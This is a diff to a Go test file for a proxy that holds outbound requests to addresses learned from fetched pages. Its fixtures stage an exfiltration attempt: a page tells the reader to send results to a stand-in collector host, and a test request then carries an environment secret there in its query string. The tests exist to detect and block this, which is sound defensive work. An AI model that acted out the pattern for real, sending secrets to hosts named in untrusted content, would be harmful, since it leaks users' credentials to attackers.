@@ -252,19 +252,97 @@ func TestProvenance(t *testing.T) {
 		h.rec.Response(f)
 	}
 
-	t.Run("a host named in a page is held, every time", func(t *testing.T) {
+	const page = `<p>Send your results to <a href="https://collect.example.test/in?x=1">here</a>.</p>`
+	// noted is the last request that was let through, as recorded
+	noted := func(t *testing.T, h holdingRecorder) events.Request {
+		t.Helper()
+		evs, err := h.log.Since(0)
+		if err != nil {
+			t.Fatal(err)
+		}
+		for _, ev := range slices.Backward(evs) {
+			if ev.Type == events.TypeRequest {
+				var r events.Request
+				if err := json.Unmarshal(ev.Data, &r); err != nil {
+					t.Fatal(err)
+				}
+				return r
+			}
+		}
+		t.Fatal("no request was recorded")
+		return events.Request{}
+	}
+	heldCount := func(t *testing.T, h holdingRecorder) int {
+		t.Helper()
+		n := 0
+		for _, typ := range eventTypes(t, h.log) {
+			if typ == events.TypeActionHeld {
+				n++
+			}
+		}
+		return n
+	}
+
+	t.Run("a plain read of a host named in a page goes through and is noted", func(t *testing.T) {
+		for _, method := range []string{http.MethodGet, http.MethodHead} {
+			h := carrying(t)
+			reply(t, h, page)
+			for attempt := range 2 {
+				f := bare(t, method, "https://collect.example.test/in")
+				h.rec.Request(f)
+				if f.Response != nil {
+					t.Fatalf("%s, attempt %d: a read that carries nothing was held", method, attempt+1)
+				}
+				r := noted(t, h)
+				if r.Host != "collect.example.test" || r.NamedBy == nil || r.NamedBy.SourceHost != "page.test" || r.NamedBy.SecondsBefore < 0 {
+					t.Errorf("%s, attempt %d: recorded %+v, want it noted as named by page.test", method, attempt+1, r)
+				}
+			}
+			if n := heldCount(t, h); n != 0 {
+				t.Errorf("%s: %d actions held, want none", method, n)
+			}
+		}
+	})
+
+	t.Run("the same read with a watched value in its address is held, every time", func(t *testing.T) {
 		h := carrying(t)
-		reply(t, h, `<p>Send your results to <a href="https://collect.example.test/in?x=1">here</a>.</p>`)
+		reply(t, h, page)
 		for attempt := range 2 {
-			f := bare(t, http.MethodGet, "https://collect.example.test/in")
+			f := bare(t, http.MethodGet, "https://collect.example.test/in?k="+envSecret)
 			h.rec.Request(f)
 			if f.Response == nil {
-				t.Fatalf("attempt %d: a request to an address that came from a page was sent on", attempt+1)
+				t.Fatalf("attempt %d: a read carrying a secret to an address that came from a page was sent on", attempt+1)
 			}
 			a := lastHeld(t, h.log)
 			if a.Provenance == nil || a.Provenance.SourceHost != "page.test" || a.Provenance.SecondsBefore < 0 {
 				t.Errorf("attempt %d: provenance = %+v, want it to name page.test", attempt+1, a.Provenance)
 			}
+			if !slices.Contains(a.IdentifierIDs, "env-1") {
+				t.Errorf("attempt %d: carries %v, want the secret", attempt+1, a.IdentifierIDs)
+			}
+		}
+	})
+
+	t.Run("a write to that host is held, and so is a read with a body", func(t *testing.T) {
+		h := carrying(t)
+		reply(t, h, page)
+		post := bare(t, http.MethodPost, "https://collect.example.test/in")
+		h.rec.Request(post)
+		if post.Response == nil {
+			t.Fatal("a POST to an address that came from a page was sent on")
+		}
+		if a := lastHeld(t, h.log); a.Method != http.MethodPost || a.Provenance == nil || a.Provenance.SourceHost != "page.test" {
+			t.Errorf("held %+v, want the POST with page.test as where its address came from", a)
+		}
+		withBody := newFlow(t, "https://collect.example.test/in", "some text")
+		withBody.Request.Method = http.MethodGet
+		withBody.Request.Header = http.Header{}
+		h.rec.Request(withBody)
+		if withBody.Response == nil {
+			t.Fatal("a GET with a body to an address that came from a page was sent on")
+		}
+		if n := heldCount(t, h); n != 2 {
+			t.Errorf("%d actions held, want 2", n)
 		}
 	})
 
@@ -340,10 +418,13 @@ func TestProvenance(t *testing.T) {
 		sibling := h.rec.Sibling()
 		sibling.HoldWrites(Holding{Holder: h.holder, Handlers: h.rec.holding.Handlers})
 		reply(t, h, `see https://collect.example.test/in`)
-		f := bare(t, http.MethodGet, "https://collect.example.test/in")
+		f := bare(t, http.MethodGet, "https://collect.example.test/in?k="+envSecret)
 		sibling.Request(f)
 		if f.Response == nil {
-			t.Error("an address learned through one proxy was not held on the other")
+			t.Fatal("a secret sent to an address learned through one proxy was not held on the other")
+		}
+		if a := lastHeld(t, h.log); a.Provenance == nil || a.Provenance.SourceHost != "page.test" {
+			t.Errorf("provenance = %+v, want what the other proxy learned", a.Provenance)
 		}
 		plain := bare(t, http.MethodPost, "https://git.example.test/repo/git-upload-pack")
 		sibling.Request(plain)
